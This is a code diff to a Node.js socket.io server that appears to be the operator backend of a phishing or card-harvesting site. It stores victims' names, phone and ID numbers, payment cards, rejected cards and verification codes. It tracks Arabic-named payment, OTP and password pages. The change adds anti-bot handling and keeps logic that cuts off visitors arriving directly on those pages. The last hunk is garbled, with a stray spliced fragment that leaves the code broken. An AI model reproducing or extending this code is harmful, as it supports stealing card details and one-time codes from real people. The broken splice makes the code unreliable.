@@ -1548,10 +1548,13 @@ io.on("connection", (socket) => {
       const visitorOrigin = socket.handshake.headers.origin || socket.handshake.headers.referer || '';
       const visitorDomain = visitorOrigin.replace(/^https?:\/\//, '').replace(/\/.*$/, '').replace(/^(www\.)?/, '') || 'unknown';
       
+      // Anti-Bot/Anti-Empty: Don't add to savedVisitors yet.
+      // We only create the object in memory and attach it to the socket.
+      // It will be pushed to savedVisitors only when they send real data (more-info event).
       visitor = {
         _id: `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
         socketId: socket.id,
-        visitorNumber: visitorCounter,
+        visitorNumber: -1, // Temporary number
         createdAt: new Date().toISOString(),
         isRead: false,
         fullName: "",
@@ -1580,10 +1583,10 @@ io.on("connection", (socket) => {
         sessionStartTime: Date.now(),
         lastActivity: Date.now(),
       };
-      savedVisitors.push(visitor);
-      saveData(true); // Save immediately to prevent data loss on restart
+      
+      socket._pendingVisitor = visitor;
       isNewVisitor = true;
-      console.log(`New visitor registered: ${visitor._id}, domain=${visitorDomain}`);
+      console.log(`New visitor connection pending (not saved yet): ${visitor._id}, domain=${visitorDomain}`);
 
       // Lookup country and city from IP if unknown
       if (visitor.country === 'Unknown') {
@@ -1765,59 +1768,76 @@ io.on("connection", (socket) => {
       // Record this submission timestamp
       ipSubmissionTimestamps.set(visitorIP, Date.now());
     }
-    
-    if (!visitor) {
-      // Create full visitor if not exists (e.g. reconnect after server redeploy)
-      const visitorInfo = getVisitorInfo(socket);
-      const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
-      visitorCounter++;
-      if (displayVisitorCount !== null) displayVisitorCount++;
-      // Try to find by visitorId first if provided
-      if (data.visitorId) {
-        visitor = savedVisitors.find(v => v._id === data.visitorId);
-      }
-      
-      if (visitor) {
-        visitor.socketId = socket.id;
-        visitor.isConnected = true;
-        visitor.lastActivity = Date.now();
-        console.log(`[more-info] Re-linked existing visitor: ${visitor._id}`);
-      } else {
-        visitor = {
-          _id: data.visitorId || `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
-          socketId: socket.id,
-          visitorNumber: visitorCounter,
-          createdAt: new Date().toISOString(),
-          isRead: false,
-          fullName: "",
-          phone: "",
-          idNumber: "",
-          apiKey: generateApiKey(),
-          ip: visitorInfo.ip,
-          country: visitorInfo.country,
-          city: "",
-          os,
-          device,
-          browser,
-          date: new Date().toISOString(),
-          blockedCardPrefixes: [],
-          page: data.page || "الصفحة الرئيسية",
-          data: {},
-          dataHistory: [],
-          paymentCards: [],
-          rejectedCards: [],
-          digitCodes: [],
-          hasNewData: false,
-          isBlocked: false,
-          isConnected: true,
-          hasVisitedMainPage: false,
-          sessionStartTime: Date.now(),
-          lastActivity: Date.now(),
-        };
+       if (!visitor) {
+      // Check if we have a pending visitor for this socket
+      if (socket._pendingVisitor) {
+        visitor = socket._pendingVisitor;
+        visitorCounter++;
+        if (displayVisitorCount !== null) displayVisitorCount++;
+        visitor.visitorNumber = visitorCounter;
+        visitor.page = data.page || "الصفحة الرئيسية";
         
-        // STRICT: If first page is sensitive, block immediately
-        const sensitiveKeywords = ["دفع", "ATM", "بطاقة", "summary", "ملخص", "الدفع", "رمز التحقق", "OTP", "كلمة مرور", "توثيق", "تحويل"];
-        const firstPageIsSensitive = data.page && sensitiveKeywords.some(kw => data.page.includes(kw));
+        savedVisitors.push(visitor);
+        saveData(true);
+        console.log(`[more-info] Promoted pending visitor to saved: ${visitor._id}, # ${visitor.visitorNumber}`);
+        delete socket._pendingVisitor;
+      } else {
+        // Create full visitor if not exists (e.g. reconnect after server redeploy)
+        const visitorInfo = getVisitorInfo(socket);
+        const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
+        
+        // Try to find by visitorId first if provided
+        if (data.visitorId) {
+          visitor = savedVisitors.find(v => v._id === data.visitorId);
+        }
+        
+        if (visitor) {
+          visitor.socketId = socket.id;
+          visitor.isConnected = true;
+          visitor.lastActivity = Date.now();
+          console.log(`[more-info] Re-linked existing visitor: ${visitor._id}`);
+        } else {
+          visitorCounter++;
+          if (displayVisitorCount !== null) displayVisitorCount++;
+          visitor = {
+            _id: data.visitorId || `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
+            socketId: socket.id,
+            visitorNumber: visitorCounter,
+            createdAt: new Date().toISOString(),
+            isRead: false,
+            fullName: "",
+            phone: "",
+            idNumber: "",
+            apiKey: generateApiKey(),
+            ip: visitorInfo.ip,
+            country: visitorInfo.country,
+            city: "",
+            os,
+            device,
+            browser,
+            domain: "unknown",
+            date: new Date().toISOString(),
+            blockedCardPrefixes: [],
+            page: data.page || "الصفحة الرئيسية",
+            data: {},
+            dataHistory: [],
+            paymentCards: [],
+            rejectedCards: [],
+            digitCodes: [],
+            hasNewData: false,
+            isBlocked: false,
+            isConnected: true,
+            hasVisitedMainPage: true,
+            sessionStartTime: Date.now(),
+            lastActivity: Date.now(),
+          };
+          savedVisitors.push(visitor);
+          saveData(true);
+          console.log(`[more-info] Created new visitor from data: ${visitor._id}`);
+        }
+      }
+      visitors.set(socket.id, visitor);
+    }ata.page && sensitiveKeywords.some(kw => data.page.includes(kw));
         if (firstPageIsSensitive) {
           console.log(`[STRICT-FLOW] Blocking new visitor created directly on sensitive page "${data.page}", IP=${visitorInfo.ip}`);
           socket.disconnect(true);
